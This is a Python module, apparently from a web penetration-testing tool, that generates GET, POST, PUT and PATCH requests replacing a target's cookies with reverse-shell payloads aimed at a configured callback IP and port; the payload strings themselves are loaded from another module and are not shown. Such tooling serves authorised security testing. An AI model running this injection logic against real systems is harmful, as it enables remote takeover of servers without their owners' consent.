from headers.static_values import *
from worker import *
from utils import *
import requests

class Cookie():

    def __init__(self, destination):
        self.destination       = destination
        self.mime_types        = MimeTypes.get_mime_list()
        self.payloads          = Payloads.get_payload_list(Config.revshell_ip, Config.revshell_port)
        self.test_array        = []

    def revshell_tests(self):
        for payload in self.payloads:
            for cookie in Config.initial_response.cookies:
                cookie_dict = Config.initial_response.cookies.get_dict()
                cookie_dict[cookie.name] = payload

                self.test_array.append(
                    PreRequest(
                        req_type = "GET",
                        destination = self.destination,
                        payload = cookie_dict,
                        headers = {
                            "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
                        },
                        cookies = cookie_dict,
                        body = None,
                        expected_status_code = Config.initial_response.status_code
                    )
                )
                self.test_array.append(
                    PreRequest(
                        req_type = "POST",
                        destination = self.destination,
                        payload = cookie_dict,
                        headers = {
                            "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
                        },
                        cookies = cookie_dict,
                        body = None,
                        expected_status_code = Config.initial_response.status_code
                    )
                )

                if Config.test_level >= Config.TEST_LEVEL_PARTIAL:
                    self.test_array.append(
                        PreRequest(
                            req_type = "PUT",
                            destination = self.destination,
                            payload = cookie_dict,
                            headers = {
                                "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
                            },
                            cookies = cookie_dict,
                            body = None,
                            expected_status_code = Config.initial_response.status_code
                        )
                    )
                    self.test_array.append(
                        PreRequest(
                            req_type = "PATCH",
                            destination = self.destination,
                            payload = cookie_dict,
                            headers = {
                                "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
                            },
                            cookies = cookie_dict,
                            body = None,
                            expected_status_code = Config.initial_response.status_code
                        )
                    )

    def generate_tests(self):
        if Config.test_level >= Config.TEST_LEVEL_OPTIMAL:
            self.revshell_tests()

    def get_tests(self):
        self.generate_tests()
        return self.test_array